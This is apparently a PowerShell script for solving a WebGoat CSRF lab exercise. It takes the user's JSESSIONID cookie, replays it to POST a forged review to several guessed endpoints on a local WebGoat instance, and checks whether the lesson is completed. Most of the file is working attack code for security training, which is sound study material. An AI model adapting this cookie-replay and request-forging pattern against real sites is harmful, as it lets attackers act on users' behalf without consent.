# CSRF POST Review Attack Script

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "WebGoat CSRF - Post Review Attack" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

Write-Host "This script will POST a review on behalf of the logged-in user." -ForegroundColor White
Write-Host ""
Write-Host "First, get your JSESSIONID from the browser:" -ForegroundColor White
Write-Host "1. Open WebGoat and log in" -ForegroundColor Gray
Write-Host "2. Press F12 to open Developer Tools" -ForegroundColor Gray
Write-Host "3. Go to Console tab" -ForegroundColor Gray
Write-Host "4. Type: document.cookie" -ForegroundColor Gray
Write-Host "5. Copy the JSESSIONID value" -ForegroundColor Gray
Write-Host ""

$rawInput = Read-Host "Paste JSESSIONID value here"

# Clean up the input
$sessionId = $rawInput -replace '"', '' -replace "'", '' -replace 'JSESSIONID=', '' -replace 'JSESSIONID:', '' -replace '\s', ''

if ([string]::IsNullOrWhiteSpace($sessionId)) {
    Write-Host "No session ID provided. Exiting." -ForegroundColor Red
    exit 1
}

Write-Host ""
Write-Host "Using session: $sessionId" -ForegroundColor Green
Write-Host ""

# Get review details
Write-Host "Enter review details:" -ForegroundColor Cyan
$stars = Read-Host "Stars (0-5, press Enter for 5)"
if ([string]::IsNullOrWhiteSpace($stars)) { $stars = "5" }

$reviewText = Read-Host "Review message (press Enter for default)"
if ([string]::IsNullOrWhiteSpace($reviewText)) {
    $reviewText = "This review was posted via CSRF attack!"
}

Write-Host ""
Write-Host "Stars: $stars" -ForegroundColor Yellow
Write-Host "Message: $reviewText" -ForegroundColor Yellow
Write-Host ""

# Create web session with cookie
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$cookie = New-Object System.Net.Cookie("JSESSIONID", $sessionId, "/", "192.168.254.112")
$session.Cookies.Add("http://192.168.254.112:8001", $cookie)

# Try different possible endpoints
$endpoints = @(
    "http://192.168.254.112:8001/WebGoat/csrf/review",
    "http://192.168.254.112:8001/WebGoat/csrf/post-review",
    "http://192.168.254.112:8001/WebGoat/CSRF/review",
    "http://192.168.254.112:8001/WebGoat/csrf/feedback"
)

Write-Host "=== Attempting CSRF POST Attack ===" -ForegroundColor Cyan
Write-Host ""

$success = $false

foreach ($endpoint in $endpoints) {
    Write-Host "Trying endpoint: $endpoint" -ForegroundColor Yellow
    
    try {
        # Try different field name combinations
        $bodyVariations = @(
            @{
                stars = $stars
                reviewText = $reviewText
            },
            @{
                stars = $stars
                review = $reviewText
            },
            @{
                stars = $stars
                reviewText = $reviewText
                review = $reviewText
            }
        )
        
        foreach ($body in $bodyVariations) {
            try {
                $response = Invoke-WebRequest -Uri $endpoint -Method Post -Body $body -WebSession $session -ContentType "application/x-www-form-urlencoded"
                
                Write-Host "✓ Response Status: $($response.StatusCode)" -ForegroundColor Green
                Write-Host ""
                Write-Host "Response Body:" -ForegroundColor Cyan
                Write-Host $response.Content -ForegroundColor White
                Write-Host ""
                
                # Try to parse as JSON
                try {
                    $jsonResponse = $response.Content | ConvertFrom-Json
                    
                    if ($jsonResponse.lessonCompleted -eq $true) {
                        Write-Host "========================================" -ForegroundColor Green
                        Write-Host "🎉 SUCCESS! Lesson Completed!" -ForegroundColor Yellow
                        Write-Host "========================================" -ForegroundColor Green
                        $success = $true
                        
                        if ($jsonResponse.feedback) {
                            Write-Host "Feedback: $($jsonResponse.feedback)" -ForegroundColor Cyan
                        }
                        break
                    }
                } catch {
                    # Not JSON, that's OK
                }
                
                if ($response.StatusCode -eq 200 -or $response.StatusCode -eq 201) {
                    Write-Host "✓ Request successful! Check WebGoat to see if the review was posted." -ForegroundColor Green
                    $success = $true
                    break
                }
                
            } catch {
                # Try next body variation
                continue
            }
        }
        
        if ($success) {
            break
        }
        
    } catch {
        Write-Host "  ✗ Failed: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    Write-Host ""
}

if (-not $success) {
    Write-Host "========================================" -ForegroundColor Red
    Write-Host "All attempts failed via PowerShell" -ForegroundColor Yellow
    Write-Host "========================================" -ForegroundColor Red
    Write-Host ""
    Write-Host "This is expected! CSRF attacks work best from browsers." -ForegroundColor Cyan
    Write-Host ""
    Write-Host "SOLUTION: Use the HTML file instead!" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "1. Make sure you're logged into WebGoat" -ForegroundColor White
    Write-Host "2. Open: csrf_post_review.html in the same browser" -ForegroundColor White
    Write-Host "3. Click the 'POST REVIEW VIA CSRF' button" -ForegroundColor White
    Write-Host "4. The review will be posted on behalf of the logged-in user" -ForegroundColor White
    Write-Host "5. Check WebGoat to verify the review appeared" -ForegroundColor White
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
